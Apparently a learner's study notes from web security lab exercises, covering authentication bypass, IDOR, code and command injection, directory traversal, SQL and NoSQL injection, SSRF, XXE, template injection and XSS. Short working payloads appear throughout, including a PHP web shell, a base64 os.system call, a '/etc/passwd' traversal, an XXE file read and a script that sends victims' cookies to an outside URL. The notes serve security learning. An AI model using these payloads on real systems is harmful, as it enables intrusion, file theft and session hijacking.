## Authentication
### 01
By modifiying the auth cookie which is used to authenticate the user we can become any user.
### 02
It is always worth checking the cookies used by the server.
### 03
By default SQL will perform a case-insensitive comparison: "admin" and "ADmin" are the same value. But when registering the check is done programmatically so we can register because "admin" and "ADmin" are not the same.
### 04
SQL ignores trailing white spaces so "admin" and "admin   " are the same. We can use the same trick to get into admin account.
### 05
Redirects don't necessarily stop the flow of execution.
```php
<?php
	if(!isset($_SESSION['username'])) {
		header("Location: /login.php");
	}
>
<html>
</html>
```
This code redirects the user but also sends the rest of html in that redirect.
Redirects of a big size should be of concern.
## Authorization
### 01
Because the code doesn't check if the user trying to access the information is the owner anyone can access everyting on the server.
```ruby
get "/infos/:id" do
	if session[:user] and User.find(session[:user])
		@info = Info.find(params[:id].to_s)
		erb :info
	else
		session.clear
		redirect "/"
	end
end
```
### 02 
Now we can't access other users information so easely. But now we can access it by trying to edit it because there is no check in edit functionality.
### 03
In most modern frameworks the code is generated automatically and one database record can be accessed with different formats (HTML, JSON). We can modify our browsers request to accept application/json to get the data in JSON.
### 04 
Because the application is not checking which paramaters are provided when creating a user we can provide an additional parameter named admin and set it to True to make our user an admin.
## Code Execution
### 01
### 02
When ordering information developers can use `usort` in PHP code to accomplish the task. The function `usort` is often used with the function `create_function` to dynamically generate the sorting function based on user controlled information.
The source code of the function looks like the following:
```c
ZEND_FUNCTION(create_function)
{
  [...]
  eval_code = (char *) emalloc(eval_code_length);
  sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));

  eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
  retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
  [...]
```
By suplying `}//` to `z_function_code` we can control the rest of the code by writing our code between the closing bracket and double slash.
### 03
Function `preg_replace` is used to implement regular expressions for t he preg_ functions in PHP. `preg_replace` function used with the `/e` modifier allows ecalutaion of PHP code.
```php
$string = "phpinfo()";
print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
```
This code first evaluates the call to `phpinfo()` then applies `strtoupper()` to it and then prints it to the screen.
### 04
When used incorrectly `assert` will evaluate the value received. This behaviour can be used to gain code execution.
### 05
We can exploit a Ruby application that uses `eval`. `eval` is a function that takes a string and executes the code in it. By supplying our code to `eval` call we can run it.
String concatenation in ruby is done using the plus sign `+` which must be url encoded.
### 06 
Python uses the same string concatenation as ruby.
### 07
If the `os` module is not imported into python we can use 
```python
__import__('os').system('CMD')
```
to import it and use the system function.
### 08
We can use base64 encoding to bypass certain checks.
```python
__import__('os').system(__import__('base64').b64decode('ENCODED_CMD'))
```
### 09

## Command Execution
### 01
When suplying a parameter to a command we can pass `;[another_command]` to make the system run our command after the first one.
### 02
In PHP we can use backticks \`\`  to execute a command (\`uname -a\`).
### 03
We can also use `$()` for the same functionality as backticks.
## Directory Traversals
### 01
Directory traversals allow us to get any file on a system. 
```php
$file = "/var/files/example/".$_GET['id'];
```
By setting the `id` parameter to `../../../../../../etc/passwd` we can make the system go back in the directory tree and give us `/etc/passwd` file.
### 03
In older versions of php you could use the null-byte `%00` which ends the string to bypass any adding of a suffix by server code.
## File Include
### 01
"File Include" vulnerabilities come from a lack of filtering, in particular when a user-controlled parameter is used as part of a file name, in a call to an including function.
If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load their own code.
## LDAP
### 01
Some LDAP servers authorise NULL bind:
If null values are sent, the LDAP server will proceed to bind the connection.
## MongoDB Injcetion
### 01
MongoDB uses `|| 1==1` instead of SQL `or 1=1`.
A null byte can also be used to terminate the rest of MongoDB query.
### 02
MongoDB blind injection is done by testing a fild with wildcards.
## Open Redirect
### 01
This vulnerability allows us to redirect a user to a malicious site. 
It is only critical when it can leak OAuth tokens.

## SQL Injection
### 01
`' or 1=1 --`
The logic behind the application is if it returns some results we are in but if it returns no results we can't authenticate. So by injecting that SQL code we make the SQL return everything thus letting us in.
### 03
We can bypass a check for returning only one result by using SQL `LIMIT`.
### 04
We can bypass a space check by using tabs which we url encode to `%09`.
### 06
This exploit relies on the usage of GBK - character set for simplified Chinese. Using the fact that the database driver and the database don't talk tke same charset it is possible to generate a single quoute and break out og the SQL syntax to inject a payload.
It is done using the string `\xBF'` (URL-encoded as `%bf%27`)
## Server Side Request Forgery
### 01
SSRF allows an attacker to use a functionality of the web application to gain access to internal resources. Basically, we are going to get the server to make HTTP request on out behalf.
### 04
We can bypass any weak regex that searches for a string `str-something.com` by making use of subdomains and inputing `str-something.com.malicious-site.com`

## File Upload
### 01
File uploads can be used to gain code execution.
Example of a php file used to gain code execution
```php
<?php
    system($_GET["cmd"]);
>
```
### 02
There are many ways to bypass a file extension filter. One of them is instead of using `.php` to use `.php3`
## Server Side Template Injecction
### 01
There is a vuln in Flask Template Engine which allows us to inject code into the template. We can chech if it exists by testing it with `{{'7' * 7}}`. If this goes thru we can get all classes with `{{[].__class__.__base__.__subclasses__()}}` and exploit from there.
## XML Attacks
### 01
Some XML parsers will resolve sxternal entities and will allow a user controlling the XML message to access resources; for example read a file on the system.
```xml
<!ENTITY x SYSTEM "file:///etc/passwd">
```
This need to be enveloped properly
```xml
<!DOCTYPE test [
    <!ENTITY x SYSTEM "file:///etc/passwd">]>
```
Then by referencing `x`: `&x;` we can execute whatever we put in the xml.
### 02
XPath is a query langugage which select nodes from an XML document. It is simillar to a SQL query.
We can use `' or 1=1]%00` to get all the results.
## Cross-Site Scripting
### 01
XSS occurs when we can inject html code into a page.
### 02
We can usually bypass a regex that checks for `<script></script` by altering the case `<scripT></scripT>`
### 03 
If we break out tag like this `<scri<script>pt>` it is going to bypass a check for a tag.
### 04
We can use other tehniques to get javascript running on a page without `script` tags.
* `<a` tag with events `onmouseover`, `onmousemove`, `onclick`
* `<img` tag with event `onerror`: `<img src='zzzz' onerror='alert(1)' />`
### 05
When a command is filtered we can use javascript `eval` and `String.fromCharCode()` to bypass it.
### 07
A well knowwn function used to HTML-encode characters `htmlentities` does not encode single quotes, unless you told it to do so using the `ENT_QUOTES` flag.
### 10
By injecting a payload:
```html
<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>
```
we can steal cookies from anyone who clicks on our url.

